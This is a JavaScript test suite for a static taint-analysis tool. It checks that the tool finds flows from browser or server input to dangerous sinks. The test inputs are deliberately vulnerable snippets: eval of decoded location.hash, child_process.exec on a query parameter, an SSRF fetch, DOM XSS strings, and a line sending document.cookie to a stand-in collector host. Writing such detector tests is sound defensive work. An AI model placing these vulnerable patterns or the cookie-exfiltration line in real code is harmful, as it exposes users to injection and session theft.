import test from 'node:test'
import assert from 'node:assert/strict'
import { analyzeTaint, renderTaintReport, TAINT_LIMITS } from '../tools/taint/index.js'
import { analyzeSample, buildReport, renderMarkdown } from '../tools/analysis/index.js'
import { normalizeTaintReport } from '../tools/taint/report.js'
import * as api from '../tools/index.js'

const SOURCE = 'const input = location.hash;\nconst decoded = atob(input);\neval(decoded);'
const stable = ({ elapsedMs, ...report }) => report

function assertJson(report) {
  assert.deepEqual(JSON.parse(JSON.stringify(report)), report)
}

test('taint public barrels expose the Circle-IR component without exposing engine internals', async () => {
  const analysis = await import('ai4reverse-web/analysis')
  const taint = await import('ai4reverse-web/taint')
  for (const barrel of [api, analysis, taint]) {
    assert.equal(barrel.analyzeTaint, analyzeTaint)
    assert.equal(barrel.renderTaintReport, renderTaintReport)
    assert.equal(barrel.TAINT_LIMITS, TAINT_LIMITS)
  }
  assert.ok(Object.isFrozen(TAINT_LIMITS))
  assert.deepEqual(Object.keys(taint).sort(), ['TAINT_LIMITS', 'analyzeTaint', 'renderTaintReport'])
})

test('Circle-IR tracks a browser source through decoding to a code injection sink', async () => {
  const report = await analyzeTaint(SOURCE, { filename: 'loader.js' })
  assert.equal(report.engine, 'circle-ir')
  assert.match(report.engineVersion, /^\d+\.\d+\.\d+/)
  assert.equal(report.enabled, true)
  assert.equal(report.ok, true)
  assert.equal(report.parse.ok, true)
  assert.equal(report.truncated, false)
  assert.equal(report.filename, 'loader.js')
  assert.equal(report.sources[0].type, 'http_param')
  assert.equal(report.sources[0].line, 1)
  assert.equal(report.sources[0].code, SOURCE.split('\n')[0])
  assert.ok(report.sinks.some((sink) => sink.cwe === 'CWE-94' && sink.line === 3 && sink.method === 'eval'))
  const flow = report.flows.find((item) => item.sink_type === 'code_injection')
  assert.equal(flow.source_line, 1)
  assert.equal(flow.sink_line, 3)
  assert.equal(flow.sanitized, false)
  assert.equal(flow.pathTruncated, false)
  assert.ok(flow.confidence > 0 && flow.confidence <= 1)
  assert.deepEqual(flow.path, [
    { variable: 'input', line: 1, type: 'source' },
    { variable: 'decoded', line: 2, type: 'assignment' },
    { variable: 'decoded', line: 3, type: 'sink' },
  ])
  assertJson(report)
})

for (const [name, source, sourceType, sinkType] of [
  ['cookie exfiltration', 'const token = document.cookie;\nfetch("https://collector.invalid", {body:token});', 'http_cookie', 'external_taint_escape'],
  ['stored payload', 'const payload = localStorage.getItem("p");\neval(payload);', 'dom_input', 'code_injection'],
  ['DOM injection', 'const input = location.search;\nconst html = "<div>" + input;\ndocument.write(html);', 'http_param', 'xss'],
  ['server input', 'app.get("/", (req, res) => {\nconst input = req.query.input;\neval(input);\n});', 'http_param', 'code_injection'],
  ['command injection', 'const input = req.query.cmd;\nrequire("child_process").exec(input);', 'http_param', 'command_injection'],
  ['untrusted URL', 'const target = req.query.target;\nfetch(target);', 'http_param', 'ssrf'],
  ['Function constructor', 'const payload = location.hash;\nnew Function(payload);', 'http_param', 'code_injection'],
]) {
  test(`taint reports ${name} with original source coordinates`, async () => {
    const report = await analyzeTaint(source)
    assert.equal(report.ok, true)
    assert.ok(report.sources.some((item) => item.type === sourceType), JSON.stringify(report))
    assert.ok(report.flows.some((item) => item.sink_type === sinkType), JSON.stringify(report))
    assert.ok(report.sinks.every((item) => source.split('\n')[item.line - 1].includes(item.code)))
  })
}

for (const source of [
  'const input = "constant";\neval(input);',
  'let input = location.hash;\ninput = "constant";\neval(input);',
  'const input = location.hash;\nconst clean = DOMPurify.sanitize(input);\ndocument.body.innerHTML = clean;',
]) {
  test(`taint does not invent a flow for a clean/overwritten/sanitized value: ${source.split('\n')[0]}`, async () => {
    const report = await analyzeTaint(source)
    assert.equal(report.ok, true)
    assert.equal(report.flows.length, 0)
    if (source.includes('DOMPurify')) assert.ok(report.sanitizers.some((item) => item.sanitizes.includes('xss')))
  })
}

test('interprocedural evidence from Circle-IR is retained', async () => {
  const report = await analyzeTaint('function relay(x) {\nreturn x;\n}\nconst value = location.hash;\nconst result = relay(value);\neval(result);')
  assert.equal(report.ok, true)
  assert.ok(report.interprocedural.tainted_methods.includes('<module>.relay'))
  assert.ok(report.flows.some((flow) => flow.source_line === 4 && flow.sink_line === 6))
  assert.equal(report.stats.taintedMethods, report.interprocedural.tainted_methods.length)
})

test('bare parameter flows are speculative and require an explicit opt-in', async () => {
  const source = 'function runPayload(payload) {\neval(payload);\n}'
  const normal = await analyzeTaint(source)
  const speculative = await analyzeTaint(source, { speculativeParamSources: true })
  assert.equal(normal.ok, true)
  assert.deepEqual(normal.flows, [])
  assert.ok(speculative.flows.some((flow) => flow.source_type === 'interprocedural_param'))
  assert.ok(speculative.flows.every((flow) => flow.confidence < 1))
})

test('custom sources, sinks and sanitizers are per-request and additive', async () => {
  const source = 'const value = readInput();\nconst output = value + "!";\npublish(output);'
  const config = {
    sources: [{ method: 'readInput', type: 'user_input', severity: 'high', return_tainted: true }],
    sinks: [{ method: 'publish', type: 'external_taint_escape', cwe: 'CWE-668', severity: 'high', arg_positions: [0] }],
  }
  const before = structuredClone(config)
  const report = await analyzeTaint(source, { config })
  assert.deepEqual(config, before)
  assert.equal(report.ok, true)
  assert.ok(report.flows.some((item) => item.source_type === 'user_input' && item.sink_type === 'external_taint_escape'))
  assert.ok((await analyzeTaint(SOURCE, { config })).flows.some((item) => item.sink_type === 'code_injection'))
  assert.equal((await analyzeTaint(source)).sources.some((item) => item.type === 'user_input'), false)
  const sanitized = await analyzeTaint('const input = location.hash;\nconst clean = scrub(input);\ndocument.body.innerHTML = clean;', {
    config: { sanitizers: [{ method: 'scrub', removes: ['xss'] }] },
  })
  assert.equal(sanitized.flows.length, 0)
  assert.ok(sanitized.sanitizers.some((item) => item.method === 'scrub()'))
  const customOnly = await analyzeTaint(source, { config, useDefaultConfig: false })
  assert.equal(customOnly.ok, true)
  assert.ok(customOnly.flows.some((item) => item.sink_type === 'external_taint_escape'))
})

for (const filename of ['loader.ts', 'loader.mts', 'loader.cts', 'loader.tsx']) {
  test(`taint infers the parser for ${filename}`, async () => {
    const result = await analyzeTaint('const input: string = location.hash;\neval(input);', { filename })
    assert.equal(result.language, filename.endsWith('tsx') ? 'tsx' : 'typescript')
    assert.equal(result.ok, true)
    assert.ok(result.flows.some((item) => item.sink_type === 'code_injection'))
  })
}

test('JSX and explicit parser selection work without resolving imports', async () => {
  const jsx = await analyzeTaint('import React from "react";\nconst view = <div>ok</div>;\nconst input = location.hash;\neval(input);', { filename: 'view.jsx' })
  assert.equal(jsx.ok, true)
  assert.equal(jsx.language, 'javascript')
  assert.ok(jsx.flows.some((flow) => flow.sink_type === 'code_injection'))
  const explicit = await analyzeTaint('const input: string = location.hash;\neval(input);', { filename: 'unknown.js', language: 'typescript' })
  assert.equal(explicit.ok, true)
  assert.equal(explicit.language, 'typescript')
})

test('syntax recovery is partial evidence, never a successful clean scan', async () => {
  const report = await analyzeTaint('const broken = ;\nconst value = location.hash;\neval(value);')
  assert.equal(report.ok, false)
  assert.equal(report.parse.ok, false)
  assert.ok(report.parse.errorCount > 0)
  assert.equal(report.parse.errors[0].line, 1)
  assert.equal(report.error.code, 'TAINT_PARSE')
  assertJson(report)
  assert.match(renderTaintReport(report), /failed \/ partial/)
  assert.equal((await analyzeTaint('')).ok, true)
})

test('invalid source/options/limits are rejected before worker execution', async () => {
  for (const value of [null, undefined, 42, {}]) await assert.rejects(() => analyzeTaint(value), TypeError)
  for (const options of [
    null, [], { language: 'python' }, { language: null }, { filename: '' }, { filename: null }, { filename: 4 },
    { limits: null }, { limits: { maxFlow: 2 } }, { limits: { maxFlows: 0 } },
    { limits: { timeoutMs: Infinity } }, { limits: { timeoutMs: '10' } },
    { limits: { timeoutMs: 1.5 } }, { limits: { memoryMb: 1 } },
    { limits: { maxPathLength: 1 } }, { useDefaultConfig: 1 }, { config: [] }, { config: null }, { maxFlows: 2 },
    { config: { source: [] } }, { config: { sinks: [{}] } },
    { config: { sources: [{ method: 'read', type: 'user_input', severity: 'oops' }] } },
    { config: { sanitizers: [{ method: 'scrub', removes: [] }] } },
  ]) await assert.rejects(() => analyzeTaint(SOURCE, options), { name: /TypeError|RangeError/ })
})

test('engine/config failures are structured and a subsequent call recovers', async () => {
  const report = await analyzeTaint(SOURCE, {
    config: { sources: [{ method: 'input', type: 'not-a-source-type', severity: 'high' }] },
  })
  assert.equal(report.ok, false)
  assert.match(report.error.message, /unknown source type/)
  assert.equal(report.flows.length, 0)
  assertJson(report)
  assert.equal((await analyzeTaint(SOURCE)).ok, true)
})

test('source byte limit rejects the whole source, including multibyte input', async () => {
  const report = await analyzeTaint('// 界界\neval(location.hash)', { limits: { maxSourceBytes: 8 } })
  assert.equal(report.ok, false)
  assert.equal(report.error.code, 'TAINT_SOURCE_LIMIT')
  assert.deepEqual(report.truncatedBy, ['source-size'])
  assert.equal(report.stats.flows, 0)
  assert.equal(report.parse.ok, false)
})

test('deadline actually interrupts the worker and does not poison later calls', async () => {
  const report = await analyzeTaint(SOURCE, { limits: { timeoutMs: 1 } })
  assert.equal(report.ok, false)
  assert.equal(report.error.code, 'TAINT_TIMEOUT')
  assert.equal(report.truncated, true)
  assert.deepEqual(report.truncatedBy, ['timeout'])
  assert.equal((await analyzeTaint(SOURCE)).ok, true)
})

test('synchronous engine work cannot block the parent or outlive its deadline', async () => {
  const source = Array.from({ length: 3000 }, (_, i) => `const value${i} = location.hash; eval(value${i});`).join('\n')
  let responsive = false
  const timer = setTimeout(() => { responsive = true }, 50)
  try {
    const report = await analyzeTaint(source, { limits: { timeoutMs: 300 } })
    assert.equal(report.ok, false)
    assert.equal(report.error.code, 'TAINT_TIMEOUT')
    assert.equal(responsive, true)
    assert.ok(report.truncatedBy.includes('timeout'))
  } finally {
    clearTimeout(timer)
  }
})

test('retention limits preserve pre-cap counts, sink endpoints and truncation evidence', async () => {
  const source = 'const input = location.hash;\nconst a = atob(input);\nconst b = a + "!";\neval(b);\ndocument.write(b);'
  const report = await analyzeTaint(source, { limits: { maxFlows: 1, maxSinks: 1, maxPathLength: 2, maxTextLength: 120 } })
  assert.equal(report.ok, true)
  assert.ok(report.stats.flows > report.flows.length)
  assert.ok(report.stats.sinks > report.sinks.length)
  assert.equal(report.flows.length, 1)
  assert.equal(report.sinks.length, 1)
  assert.ok(report.truncatedBy.includes('flow-limit'))
  assert.ok(report.truncatedBy.includes('sink-limit'))
  assert.ok(report.truncatedBy.includes('path-limit'))
  assert.equal(report.flows[0].pathTruncated, true)
  assert.equal(report.flows[0].path.length, 2)
  assert.equal(report.flows[0].path[0].type, 'source')
  assert.equal(report.flows[0].path.at(-1).type, 'sink')
  assertJson(report)
  assert.deepEqual(normalizeTaintReport(report), report)
})

test('short evidence text limits do not clip semantic metadata or failure codes', async () => {
  const report = await analyzeTaint(SOURCE, { filename: 'original-loader.js', limits: { timeoutMs: 1, maxTextLength: 1 } })
  assert.equal(report.error.code, 'TAINT_TIMEOUT')
  assert.equal(report.filename, 'original-loader.js')
  assert.equal(report.language, 'javascript')
  assert.equal(report.error.message.length, 1)
  assert.ok(report.truncatedBy.includes('text-limit'))
  assert.deepEqual(normalizeTaintReport(report), report)
})

test('projection bounds all evidence lists and text without changing original counts', () => {
  const entry = { type: 'xss', location: 'x'.repeat(2000), method: 'm', code: 'x'.repeat(2000), line: 5 }
  const report = normalizeTaintReport({
    enabled: true, ok: true, parse: { ok: true, errors: Array(30).fill({ message: 'oops' }) },
    sources: Array(3).fill(entry), sinks: Array(3).fill(entry), sanitizers: Array(3).fill(entry),
    interprocedural: { tainted_methods: Array(3).fill('m'), method_flows: Array(3).fill({}) },
    limits: { ...TAINT_LIMITS, maxSources: 1, maxSinks: 1, maxSanitizers: 1, maxFlows: 1, maxTextLength: 100 },
  })
  assert.equal(report.sources.length, 1)
  assert.equal(report.sources[0].code.length, 100)
  assert.equal(report.stats.sources, 3)
  assert.equal(report.stats.sinks, 3)
  assert.equal(report.stats.sanitizers, 3)
  assert.equal(report.parse.errors.length, 20)
  assert.equal(report.interprocedural.tainted_methods.length, 1)
  assert.equal(report.interprocedural.method_flows.length, 1)
  assert.equal(report.truncated, true)
  assertJson(report)
})

test('concurrent analyses are deterministic and cannot share custom configuration or state', async () => {
  const reports = await Promise.all(Array.from({ length: 3 }, () => analyzeTaint(SOURCE)))
  assert.deepEqual(stable(reports[0]), stable(reports[1]))
  assert.deepEqual(stable(reports[1]), stable(reports[2]))
  const again = await analyzeTaint(SOURCE)
  assert.deepEqual(stable(reports[0]), stable(again))
})

test('static analysis does not evaluate code, imports, network requests, eval or host globals', async () => {
  const sentinel = '__ai4reverse_taint_executed__'
  assert.equal(globalThis[sentinel], undefined)
  const report = await analyzeTaint(`import "./module-that-does-not-exist.js";\nglobalThis.${sentinel} = true;\nprocess.exit(77);\nwhile (true) {}\nfetch("https://must-not-contact.invalid");\neval("throw new Error('must not execute')");`)
  assert.equal(report.ok, true)
  assert.equal(globalThis[sentinel], undefined)
})

test('analyzeSample runs taint on original bytes even with dynamic execution disabled', async () => {
  const source = '// original line 1\n\nconst input = location.hash;\neval(input);'
  const result = await analyzeSample(source, { dynamic: false, constraints: false })
  assert.equal(result.run, null)
  assert.equal(result.taint.ok, true)
  assert.equal(result.report.static.taint.flows[0].source_line, 3)
  assert.equal(result.report.static.taint.flows[0].sink_line, 4)
  assert.deepEqual(result.report.static.taint, { ...result.taint, elapsedMs: 0 })
  assert.match(result.markdown, /## Taint analysis/)
  assert.match(result.markdown, /CWE-94/)
  assertJson(result.report)
})

test('disabled, failed and partial taint analyses retain a stable composed report', async () => {
  const disabled = await analyzeSample(SOURCE, { dynamic: false, restore: false, constraints: false, taint: false })
  assert.equal(disabled.taint, null)
  assert.equal(disabled.report.static.taint.enabled, false)
  assert.deepEqual(disabled.report.static.taint.flows, [])
  assert.doesNotMatch(disabled.markdown, /## Taint analysis/)
  const failed = await analyzeSample(SOURCE, { dynamic: false, restore: false, constraints: false, taint: { limits: { timeoutMs: 1 } } })
  assert.equal(failed.taint.error.code, 'TAINT_TIMEOUT')
  assert.equal(failed.report.static.parse.ok, true)
  assert.match(failed.markdown, /TAINT\\_TIMEOUT/)
  for (const taint of [{ limits: { typo: 1 } }, 'yes', null, []]) {
    const badOptions = await analyzeSample(SOURCE, { dynamic: false, constraints: false, taint })
    assert.equal(badOptions.taint.error.code, 'TAINT_OPTIONS')
  }
  const empty = buildReport({})
  assert.equal(empty.static.taint.enabled, false)
  assertJson(empty)
  assert.doesNotThrow(() => renderMarkdown(empty))
})

test('taint evidence is additive and does not alter verdict weights', async () => {
  const options = { dynamic: false, restore: false, constraints: false }
  const enabled = await analyzeSample(SOURCE, options)
  const disabled = await analyzeSample(SOURCE, { ...options, taint: false })
  assert.deepEqual(enabled.report.verdict, disabled.report.verdict)
  assert.deepEqual(enabled.report.provenance, disabled.report.provenance)
})

test('Markdown escapes source-controlled HTML, table delimiters and line breaks', () => {
  const rendered = renderTaintReport({
    enabled: true, filename: '<script>|\n# injected',
    sources: [{ code: '<img src=x onerror=alert(1)>|\n## injected', location: 'x' }],
  })
  assert.doesNotMatch(rendered, /<script>|<img|\n## injected/)
  assert.match(rendered, /&lt;img/)
  assert.match(rendered, /\\\|/)
  assert.doesNotMatch(rendered, /\[object Object\]/)
  assert.doesNotThrow(() => renderTaintReport(null))
})
